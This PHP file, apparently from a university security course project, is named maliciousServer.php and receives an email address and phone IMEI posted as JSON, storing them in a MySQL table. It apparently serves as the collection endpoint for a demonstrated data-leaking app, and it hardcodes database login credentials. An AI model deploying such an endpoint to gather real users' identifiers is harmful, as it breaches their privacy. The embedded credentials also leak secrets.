<?php
    #http://impcalendar.web.engr.illinois.edu/maliciousServer.php
    error_log("Someone was here! <maliciousServer.php>", 0);
    $json = file_get_contents('php://input');
    $data= json_decode($json);
    #Ensure that the client has provided a value for "email" 
    if( json_last_error() == JSON_ERROR_NONE && isset($data->email))
    {  
        #Extract variables 
        $email = $data->email;
        $imei = $data->imei;
        #Connect to Database 
        $con = mysql_connect("engr-cpanel-mysql.engr.illinois.edu","impcalen_CS460ad","Cs460");
        mysql_select_db("impcalen_CS460");
        
        #Escape special characters to avoid SQL injection attacks 
    	$email = mysql_real_escape_string($email);
    	$imei = mysql_real_escape_string($imei); 
    					
    	#Query the database to get the user details. 
    	$resultset = mysql_query("INSERT INTO emails (email, imei) VALUES ('$email','$imei')");
    	$response = array("status" => "");
        if($resultset) 
        {
            #success
            $response["status"] = "Success";
        }
        else
        {
            $response["status"] = "failure";
    	}
        mysql_close();
    	echo json_encode($response);
    }
    else
    { 
        echo "Could not complete query. Missing parameter";
        error_log("Someone couldn't query!", 0);
    }     
?>